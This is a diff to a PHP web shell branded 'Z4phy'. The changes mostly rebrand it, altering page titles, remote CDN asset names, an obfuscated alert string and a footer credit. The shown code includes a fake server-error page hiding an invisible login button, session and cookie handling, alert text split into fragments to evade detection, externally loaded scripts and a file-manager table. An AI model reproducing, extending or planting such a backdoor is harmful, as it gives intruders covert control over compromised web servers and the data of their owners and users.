@@ -393,7 +393,7 @@ if (isset($_POST['z4phy-boy'])) {
         $_SESSION["tabrakz4p"] = "tabrakz4p";
         setcookie('z4phyc0de', $my_self, time() + 3600 * 24);
     } else {
-        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Go"." A"."wa"."y "."No"."ob"."!!')".";<"."/s"."cr"."ip"."t>";
+        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Go"." A"."wa"."y "."No"."ob"."!!"." -"." Z"."4P"."HY"." H"."ER"."E')".";<"."/s"."cr"."ip"."t>";
     }
 }
 if (isset($_GET['logout'])) {
@@ -421,7 +421,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
 <button type="submit" name="z4phy-boy" style="background: #fff; color: #fff; border: none; outline: none; cursor: pointer;">&gt;&gt;</button>
 </form>
 </div>
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/js/custome.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/js/z4p.js"></script>
 </body></html>
 <?php
         exit();
@@ -440,17 +440,17 @@ $path = str_replace("\\", "/", $path);
 <html xmlns="http://www.w3.org/1999/xhtml">
 
 <head>
-    <title>.:<?=$s_he_ll_Name?>:. <?=$this_domain?></title>
+    <title>$ .:<?=$s_he_ll_Name?>:. $ <?=$this_domain?></title>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=1024" />
-    <meta name="description" content="<?=$s_he_ll_Name?> C0DE" />
+    <meta name="description" content="$ .:<?=$s_he_ll_Name?>:. $" />
     <meta name="robots" content="noindex, nofollow" />
     <meta name="googlebot" content="noindex, nofollow" />
     <meta name="bingbot" content="noindex, nofollow" />
-    <meta property="og:site_name" content="<?=$s_he_ll_Name?>" />
+    <meta property="og:site_name" content="$ .:<?=$s_he_ll_Name?>:. $" />
     <meta property="og:url" content="<?=$this_url?>" />
-    <meta property="og:title" content=".:<?=$s_he_ll_Name?>:. <?=$this_domain?>" />
-    <meta property="og:description" content="<?=$s_he_ll_Name?> C0DE" />
+    <meta property="og:title" content="$ .:<?=$s_he_ll_Name?>:. $ <?=$this_domain?>" />
+    <meta property="og:description" content="$ .:<?=$s_he_ll_Name?>:. $" />
     <meta property="og:image" content="<?=$s_he_ll_Logo?>" />
     <meta property="og:image:secure_url" content="<?=$s_he_ll_Logo?>" />
     <link rel="shortcut icon" href="<?=$s_he_ll_Icon?>" type="image/x-icon" />
@@ -466,7 +466,7 @@ $path = str_replace("\\", "/", $path);
     }
     </script>
     <!-- Custom Css -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/css/style.css" media="all">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/z4phyr/z4phy-c0de/z4phy-mini/css/z4p.css" media="all">
 </head>
 
 <body>
@@ -1065,7 +1065,7 @@ $path = str_replace("\\", "/", $path);
         ?>
         <div class="uk-overflow-auto uk-flex uk-flex-center uk-flex-middle uk-flex-row uk-flex-wrap">
             <form action="" method="POST" enctype="multipart/form-data" class="uk-width-1-1">
-                <table class="nulz-table uk-width-1-1">
+                <table class="z4p-table uk-width-1-1">
                     <thead>
                         <tr>
                             <th>Select All<br><input type="checkbox" id="checkall" class="checkall" name="checkall" aria-label="Checkbox"></th>
@@ -1258,9 +1258,8 @@ $path = str_replace("\\", "/", $path);
         </div>
     </div>
     <div class="footer uk-margin-large-top uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-nowrap" style="background: var(--gray-950);">
-    <!-- Hadehh lammer kang recode, tinggal pake doang malah di recode -->
         <div class="footer-content uk-padding-small">
-            <span class="font-protest-riot"><font class="font-poppins">&copy;2020 - <?=date("Y");?></font> | <a class="font-rose" href="https://t.me/zaynphantomhive">Z4phy Phantomhive</a></span>
+            <span class="font-protest-riot"><font class="font-poppins">&copy;2020 - <?=date("Y");?></font> | <a class="font-rose" href="https://t.me/zaynphantomhive">Z4PHY PHANT0MHIVE</a></span>
         </div>
     </div>
     <script src="<?=$uikit_js?>"></script>
